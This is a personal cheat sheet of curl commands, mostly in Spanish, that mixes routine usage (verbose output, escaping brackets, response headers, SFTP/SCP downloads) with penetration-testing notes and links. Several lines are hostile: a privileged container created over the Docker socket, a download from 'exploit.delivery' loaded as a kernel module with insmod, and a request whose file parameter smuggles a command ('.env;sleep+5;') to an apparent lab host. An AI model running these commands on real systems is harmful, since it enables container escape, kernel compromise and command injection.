# Curl


curl -v (--verbose)

escapar los corchetes con %5B para [ y %5D para ]

Incorrecto

    curl -v http://internal-api-organization.abc/king/prod/alertas/[Flaco] Read ssh information/escalation-policies  

Correcto

    curl -v http://internal-api-organization.abc/king/prod/alert-types/%5BFlaco%5D%20Read%20ssh%20information/escalation-policies


Se pueden ver cabeceras

    X-Content-Type-Options: nosniff
    X-Request-ID:
    X-Frame-Options: DENY
    X-XSS-Protection: 1; mode=block
    X-Nginx-Host:
    X-Nginx-Pool:
    X-Nginx-UpstreamHost:
    X-Upstream-Server: envoy


Incluir encabezados en la respuesta

    curl -i (Incluir encabezados en la respuesta)


Mostrar el tiempo de conexión y otras métricas con -w


https://gist.github.com/subfuzion/08c5d85437d5d4f00e58




    curl --unix-socket $SOCKPATH -d '{"Image":"bad", "Privileged":"true"}' -H 'Content-Type: application/json' 0/containers/create

    curl -O exploit.delivery/bad.ko && insmod bad.ko


    Get a file from an SSH server using SFTP:

    curl -u username sftp://example.com/etc/issue
    Get a file from an SSH server using SCP using a private key (not password-protected) to authenticate:

    curl -u username: --key ~/.ssh/id_rsa scp://example.com/~/file.txt
    Get a file from an SSH server using SCP using a private key (password-protected) to authenticate:

    curl -u username: --key ~/.ssh/id_rsa --pass private_key_password
    scp://example.com/~/file.txt

    curl -A 'Mozilla/3.0 (Win95; I)' http://www.bank.example.com/


Reference

    https://curl.se/docs/tutorial.html


    https://www.lazyhackers.in/posts/curl-command-cheat-sheet-for-penetration-testing


    https://github.com/frizb/HackingWithCurl


    https://cyber4hack.com/comando-curl-para-pentesting/


    $ curl --referer

    https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc

curl que carga archivo (bee)



    time curl -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU5ODE3M2ZjMDkzOTA0NjJmOTFiYWEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNlY25pZ21hQHRlc3QuY29tIiwiaWF0IjoxNjQyNjkzMTkyfQ.dxEs0eV1nPf4CctskzZ1DlWeOgi7tWaYHBD29A7gfx8' 'http://10.10.11.120/api/logs?file=.env;sleep+5;'